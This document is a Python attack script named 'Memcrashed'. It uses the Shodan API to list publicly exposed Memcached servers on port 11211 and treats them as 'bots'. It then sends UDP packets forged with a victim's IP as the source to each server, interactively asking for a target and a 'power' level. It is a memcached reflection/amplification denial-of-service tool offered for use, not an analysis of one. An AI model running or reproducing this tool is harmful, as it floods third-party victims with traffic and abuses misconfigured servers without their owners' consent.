#!/usr/bin/python
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager

starttime=time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        old_stdout = sys.stdout
        sys.stdout = devnull
        try:  
            yield
        finally:
            sys.stdout = old_stdout

class color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = color.HEADER + '''

███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                       Author: @037
                                                                                      
'''
print(logo)

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readlines()
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
    file.write(SHODAN_API_KEY)
    print('[*] File written: ./api.txt')
    file.close()

print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
            results = api.search('product:"Memcached" port:11211')

            print('[✓] API Key Authentication: SUCCESS')
            print('[*] Number of bots: %s' % results['total'])
            print('')

            target = input("[*] Enter target IP address: ")
            power = int(input("[*] Enter preferred power (Default 1): ") or "1")

            iplist = input('[*] Would you like to display all bots? <Y/n>: ').lower()
            if iplist.startswith('y'):
                print('')
                counter= int(0)
                for result in results['matches']:
                    host = api.host('%s' % result['ip_str'])
                    counter=counter+1
                    print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                    time.sleep(2.0 - ((time.time() - starttime) % 2.0))
            else:
                print('')
            print('')
            engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
            if engage.startswith('y'):
                for result in results['matches']:
                    if power>1:
                       print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                       with suppress_stdout():
                           send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211), count=power)
                    elif power==1:
                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                        with suppress_stdout():
                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211), count=power)
            else:
                print('[✘] Error: %s not engaged!' % target)
                print('[~] Restarting Platform! Please wait.')
                print('')

    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                file.write(SHODAN_API_KEY)
                print('[*] File written: ./api.txt')
                file.close()
                print('[~] Restarting Platform! Please wait.')
                print('')
            else:
                print('')
                print('[•] Exiting Platform. Have a wonderful day.')
                break